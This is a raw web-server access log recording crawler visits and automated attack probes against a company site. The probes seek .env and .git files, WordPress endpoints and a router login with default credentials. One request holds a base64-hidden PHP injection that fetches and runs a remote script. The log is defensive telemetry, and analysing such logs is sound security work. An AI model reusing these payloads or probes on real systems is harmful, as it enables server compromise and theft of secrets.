k9m3xxKr--,,,,,GET,/home/jsp/sb.jsp?scrId=services5.null&appCode=YMPL&clearScreenCache=true,OTHER,302,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
YIEyD3jp--,,,,,GET,/home/timeout?gS=SESSION_EXPIRED,OTHER,404,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
beIhsmEX--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
A0KrARDA--,,,,,GET,/home/our-services/oem-contract-manufacturing,OTHER,200,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.113 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
2YtF5fta--,,,,,GET,/home/jsp/sb.jsp?scrId=services4.null&appCode=YMPL&clearScreenCache=true,OTHER,302,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
uckDo0AQ--,,,,,GET,/,OTHER,200,0,,,Hello World/1.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
4AqS3DAA--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
zE7wWzsY--,,,,,GET,/,OTHER,200,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
aPeAKEtX--,,,,,GET,/home/our-products/stand-point-of-sale,OTHER,200,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.113 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
0rhRwrFM--,,,,,GET,/home/js/lib/jquery-ui-1.12.1.js,OTHER,200,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
tSU3RgBM--,,,,,GET,/home/js/lang/i18n_fr.js,OTHER,200,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
WKDX9Il9--,,,,,GET,/home/js/lang/LanguageChange.js,OTHER,200,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
qhDZR3mV--,,,,,GET,/home/js/info_dialog.js,OTHER,200,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
zDd1aFof--,,,,,GET,/home/jsp/sb.jsp?scrId=standpoint.null&appCode=YMPL&clearScreenCache=true,OTHER,302,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
D8Elf0VG--,,,,,GET,/home/theme1/js/jquery-1.10.2.min.js,OTHER,200,0,,,"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.92 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
wfKUyWTB--,,,,,GET,/.env,OTHER,404,0,,,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
qSmQ625y--,,,,,GET,/.git/config,OTHER,404,0,,,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
Q7OkMHFM--,,,,,GET,/,OTHER,200,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
wl3mzNdR--,,,,,GET,/,OTHER,200,0,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
JUOqeeNy--,,,,,GET,/favicon.ico,OTHER,404,0,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
7dFwKQTk--,,,,,GET,/,OTHER,200,0,,,Hello World/1.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
RFDIfzgl--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
0lhm3BBr--,,,,,GET,/wp-includes/ID3/license.txt,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
ppEle6rm--,,,,,GET,/feed/,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
i6g2U9mw--,,,,,GET,/xmlrpc.php?rsd,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
MyC1xskv--,,,,,GET,/blog/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
bRicdtUS--,,,,,GET,/web/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
ggEIl32T--,,,,,GET,/wordpress/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
9iTdpEXB--,,,,,GET,/wp/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
CjC7Zw39--,,,,,GET,/2020/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
MjlzaDRE--,,,,,GET,/2019/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
udWdgZ6n--,,,,,GET,/2021/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
FXP5jwEv--,,,,,GET,/shop/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
eP1DJ2Mf--,,,,,GET,/wp1/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
l6eJJ4XD--,,,,,GET,/test/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
h1oMYu7o--,,,,,GET,/site/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
QUr9P533--,,,,,GET,/cms/wp-includes/wlwmanifest.xml,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
U4Go4bRn--,,,,,GET,/,OTHER,200,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
iG8hZxr0--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
qkTbKtGG--,,,,,GET,/favicon.ico,OTHER,404,0,,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
9zauxnVy--,,,,,GET,/,OTHER,200,0,,,Hello World/1.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
jxRUbQxp--,,,,,GET,/robots.txt,OTHER,404,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
KKNR6paX--,,,,,POST,/xmlrpc.php,PHP,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
5DYPTnja--,,,,,POST,/xmlrpc.php,PHP,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
lk1hOJCK--,,,,,POST,/xmlrpc.php,PHP,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
nfUrYT4z--,,,,,POST,/xmlrpc.php,PHP,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
TbRSy4rn--,,,,,GET,/,OTHER,200,0,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
S2P4s7XT--,,,,,GET,/favicon.ico,OTHER,404,0,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
QkhA20VT--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
pdVNlU40--,,,,,GET,/,OTHER,200,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
AbCpc09B--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) MicroMessenger Weixin QQ AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.62 XWEB/2692 MMWEBSDK/200901 Mobile Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
jgJWt2SJ--,,,,,GET,/,OTHER,200,0,,,Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
6K3bcpE6--,,,,,GET,/,OTHER,200,0,,,Hello World/1.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
HjmQ8rRB--,,,,,GET,/robots.txt,OTHER,404,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
kZijM8jj--,,,,,GET,/.env,OTHER,404,0,,,MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
Cbph2G5k--,,,,,GET,/,OTHER,200,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
3hSqVX13--,,,,,GET,/.env,OTHER,404,0,,,Mozilla/5.0 (Windows NT 6.0; rv:36.0) Gecko/20100101 Firefox/36.0 SeaMonkey/2.33.1,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
DmwiE02F--,,,,,GET,/.env,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.2.516 Yowser/2.5 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
KTQ6XzXK--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
lZWaXfZ5--,,,,,GET,/partymgr/control/main,OTHER,404,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
bOelzoZc--,,,,,GET,/robots.txt,OTHER,404,0,,,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
e2T7dvXZ--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
d2njeXHN--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
nilexgvh--,,,,,GET,/,OTHER,200,0,,,Hello World/1.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
Ng3gDujf--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
CgseWNAX--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
Q40Cg2gn--,,,,,GET,/.env,OTHER,404,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
bTxIeW7L--,,,,,GET,/.env,OTHER,404,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
MRHIe1CL--,,,,,GET,/.env,OTHER,404,0,,,"Mozilla/5.0 (Linux; Android 9; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
HlzbEPfk--,,,,,GET,/,OTHER,200,0,,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
nBDTXUdr--,,,,,GET,/favicon.ico,OTHER,404,0,,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
IELfznhz--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
mReYQR70--,,,,,GET,/favicon.ico,OTHER,404,0,,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
Wr23Ua91--,,,,,GET,"/index.php?p=admin/dashboard&a=<?=shell_exec(base64_decode(""Y3VybCA0NS4zOC4yMC4xMTUgfCBzaA==""));die()?>",OTHER,404,0,,,Mozilla/5.0 (X11; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
04VApfOG--,,,,,GET,/robots.txt,OTHER,404,0,,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
qt285Nm5--,,,,,GET,/favicon.ico,OTHER,404,0,,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
4VwbNwcr--,,,,,GET,/robots.txt,OTHER,404,0,,,facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php),False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
WfYDiFQc--,,,,,GET,/,OTHER,200,0,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
jtXhv0si--,,,,,GET,/favicon.ico,OTHER,404,0,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
NTj0TWi8--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
EpjslPlS--,,,,,GET,/,OTHER,200,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
qsBwFxzP--,,,,,POST,/boaform/admin/formLogin,OTHER,404,0,,,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
w5o8lgkF--,,,,,GET,/admin/assets/js/pbxlib.js,OTHER,404,0,,,xfa1,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
3uKcFFD5--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
2dMkzXmz--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
qakwuGIL--,,,,,GET,/boaform/admin/formLogin?username=adminisp&psd=adminisp,OTHER,404,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
wcFkM7Vj--,,,,,GET,/,OTHER,200,0,,,Hello World/1.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
SzkdflJR--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
JYrFlmC8--,,,,,GET,/acmee/?,OTHER,206,0,,,LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com),False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
oGi1LOvH--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
V6rvckZ6--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 zgrab/0.x""] [severity ""2""] [ver ""OWASP_CRS/4.10.0""] [maturity ""0""] [accuracy ""0""] [tag ""application-multi""] [tag ""language-multi""] [tag ""platform-multi""] [tag ""attack-reputation-scanner""] [tag ""paranoia-level/1""] [tag ""OWASP_CRS""] [tag ""capec/1000/118/224/541/310""] [tag ""PCI/6.5.10""] [hostname ""www.yalamanchilimanufacturing.com""] [uri ""/""] [unique_id ""174900484662.507638""] [ref ""o12,5v47,21""]",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
kPOk2iU0--,,,,,POST,/boaform/admin/formLogin,OTHER,404,0,,,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
GxZUZO6a--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 zgrab/0.x""] [severity ""2""] [ver ""OWASP_CRS/4.10.0""] [maturity ""0""] [accuracy ""0""] [tag ""application-multi""] [tag ""language-multi""] [tag ""platform-multi""] [tag ""attack-reputation-scanner""] [tag ""paranoia-level/1""] [tag ""OWASP_CRS""] [tag ""capec/1000/118/224/541/310""] [tag ""PCI/6.5.10""] [hostname ""servicedesk.yalamanchili.in""] [uri ""/""] [unique_id ""174900485965.441517""] [ref ""o12,5v48,21""]",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
gp52uYkm--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 zgrab/0.x""] [severity ""2""] [ver ""OWASP_CRS/4.10.0""] [maturity ""0""] [accuracy ""0""] [tag ""application-multi""] [tag ""language-multi""] [tag ""platform-multi""] [tag ""attack-reputation-scanner""] [tag ""paranoia-level/1""] [tag ""OWASP_CRS""] [tag ""capec/1000/118/224/541/310""] [tag ""PCI/6.5.10""] [hostname ""www.tradeshowservices.in""] [uri ""/""] [unique_id ""17490048628.956269""] [ref ""o12,5v47,21""]",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
EPz3ciqo--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 zgrab/0.x""] [severity ""2""] [ver ""OWASP_CRS/4.10.0""] [maturity ""0""] [accuracy ""0""] [tag ""application-multi""] [tag ""language-multi""] [tag ""platform-multi""] [tag ""attack-reputation-scanner""] [tag ""paranoia-level/1""] [tag ""OWASP_CRS""] [tag ""capec/1000/118/224/541/310""] [tag ""PCI/6.5.10""] [hostname ""servicedesk.yalamanchili.in""] [uri ""/""] [unique_id ""174900491943.381044""] [ref ""o12,5v48,21""]",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
z2sSq69p--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 zgrab/0.x""] [severity ""2""] [ver ""OWASP_CRS/4.10.0""] [maturity ""0""] [accuracy ""0""] [tag ""application-multi""] [tag ""language-multi""] [tag ""platform-multi""] [tag ""attack-reputation-scanner""] [tag ""paranoia-level/1""] [tag ""OWASP_CRS""] [tag ""capec/1000/118/224/541/310""] [tag ""PCI/6.5.10""] [hostname ""www.yalamanchilimanufacturing.com""] [uri ""/""] [unique_id ""174900505875.453516""] [ref ""o12,5v47,21""]",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
Xif9Emz7--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 zgrab/0.x""] [severity ""2""] [ver ""OWASP_CRS/4.10.0""] [maturity ""0""] [accuracy ""0""] [tag ""application-multi""] [tag ""language-multi""] [tag ""platform-multi""] [tag ""attack-reputation-scanner""] [tag ""paranoia-level/1""] [tag ""OWASP_CRS""] [tag ""capec/1000/118/224/541/310""] [tag ""PCI/6.5.10""] [hostname ""www.tradeshowservices.in""] [uri ""/""] [unique_id ""174900507997.378273""] [ref ""o12,5v47,21""]",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
JhdzP2N7--,,,,,GET,/,OTHER,200,0,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36",False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
36Z3Jpys--,,,,,GET,/,OTHER,200,0,,,Hello World/1.0,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
HYHL8a2w--,,,,,GET,/,OTHER,200,0,,,,False,False,False,iptables,2025-08-11T11:30:16.134421+00:00
